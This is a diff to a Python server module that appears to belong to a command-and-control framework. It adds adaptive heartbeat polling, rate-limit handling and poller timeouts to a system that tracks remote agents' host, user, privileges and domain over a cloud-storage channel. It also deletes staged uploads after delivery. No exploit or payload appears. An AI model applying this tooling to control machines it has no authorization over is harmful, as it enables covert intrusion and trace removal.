@@ -27,7 +27,7 @@ def _parse_heartbeat(text: str) -> dict:
     p    = text.split("|")
     keys = ["timestamp", "host", "user", "ip", "os", "privs",
             "agent_start_cwd", "op_cwd", "ip_ext", "pid", "process", "domain", "blob_path",
-            "blob_tried", "seq"]
+            "blob_tried", "seq", "next_hb_at"]
     return {keys[i]: p[i] if i < len(p) else "" for i in range(len(keys))}
 
 
@@ -131,6 +131,14 @@ class HeartbeatMonitor(threading.Thread):
                 sess.state.update(last_hb_ts=ts, last_seen_at=now)
             else:
                 sess.state.update(last_hb_ts=ts)
+
+            # Store agent-provided next_hb_at hint for adaptive polling
+            next_hb_raw = hb.get("next_hb_at", "")
+            if next_hb_raw:
+                try:
+                    sess._next_hb_at = float(next_hb_raw)
+                except (ValueError, TypeError):
+                    pass
         diff = (now - sess.state.last_seen_at) if sess.state.last_seen_at else float("inf")
         new_state = (
             "online"  if diff < sess.agent_sleep * sess.hb_warn_multiplier else
@@ -267,6 +275,13 @@ def _initial_hb_check(sess: Session):
                 upd["remote_cwd"] = new_start_cwd
         if hb.get("op_cwd"): upd["remote_cwd"] = hb["op_cwd"]
         sess.state.update(**upd)
+        # Seed next_hb_at hint for adaptive polling on restart
+        next_hb_raw = hb.get("next_hb_at", "")
+        if next_hb_raw:
+            try:
+                sess._next_hb_at = float(next_hb_raw)
+            except (ValueError, TypeError):
+                pass
         # Suppress the "Agent connected" notification on server restart —
         # the agent was already known before, we are just restoring state.
         # The monitor will fire a real notification only when a NEW heartbeat arrives.
@@ -282,13 +297,16 @@ def _initial_hb_check(sess: Session):
 
 class AsyncPoller(threading.Thread):
     def __init__(self, session: Session, baseline: str, display_cmd: str, cmd_id: str,
-                 session_token: str = ""):
+                 session_token: str = "", timeout_override: Optional[float] = None,
+                 silent_timeout: bool = False):
         super().__init__(daemon=True, name=f"poll-{session.id}-{cmd_id[:4]}")
         self.session       = session
         self.baseline      = baseline
         self.display_cmd   = display_cmd
         self.cmd_id        = cmd_id
         self.session_token = session_token
+        self._timeout_override = timeout_override
+        self._silent_timeout   = silent_timeout
         self._stop         = threading.Event()
         self.done          = threading.Event()
         self.result: Optional[str] = None
@@ -298,9 +316,13 @@ class AsyncPoller(threading.Thread):
     def run(self):
         sess  = self.session
         start = time.time()
+        poll_timeout = self._timeout_override if self._timeout_override is not None else sess.poll_timeout
         try:
             while not self._stop.is_set():
-                if time.time() - start >= sess.poll_timeout:
+                if time.time() - start >= poll_timeout:
+                    if self._silent_timeout:
+                        # Recovery poller for expired command — no action needed
+                        return
                     _n_err(f"[{self.cmd_id}] timeout waiting for: {self.display_cmd}")
                     # Hold poller_lock so send_async can't upload a new command between
                     # the _stop check and the delete completing (eliminates TOCTOU window).
@@ -321,7 +343,11 @@ class AsyncPoller(threading.Thread):
                             _n_output(self.cmd_id, "ERROR: timeout — no response from agent")
                     return
 
-                raw = sess.transport.download(sess.profile.output_path)
+                try:
+                    raw = sess.transport.download(sess.profile.output_path)
+                except RateLimitedError:
+                    self._stop.wait(sess.poll_interval)
+                    continue
                 if raw:
                     text = raw.decode("utf-8", errors="replace").strip()
                     if text and text != self.baseline and text != MZ_MARKER:
@@ -423,6 +449,13 @@ class AsyncPoller(threading.Thread):
                             if status == "ok":
                                 _save_ul_record(sess.id, ul_info, sess.hist._log_dir)
                                 _n_ul_confirmed(sess.id)
+                                # Delete staging file from cloud after confirmed delivery
+                                _stg = ul_info.get("staging_path", "")
+                                if _stg:
+                                    try:
+                                        sess.transport.delete(_stg)
+                                    except Exception:
+                                        pass
 
                         sess.hist.update_response(self.result)
                         _n_output(self.cmd_id, self.result)
@@ -473,7 +506,10 @@ def send_async(session: Session, task_json: str, display: str, cmd_id: str = "",
         # Snapshot baseline before upload so the poller knows what "no response yet" looks like.
         # Done inside the thread (network call) but captured into a local so the AsyncPoller
         # uses the value current at upload time, not whatever session.baseline is later.
-        cur = session.transport.download(session.profile.output_path)
+        try:
+            cur = session.transport.download(session.profile.output_path)
+        except RateLimitedError:
+            cur = None
         captured_baseline = cur.decode("utf-8", errors="replace").strip() if cur else session.baseline
         session.baseline = captured_baseline
 
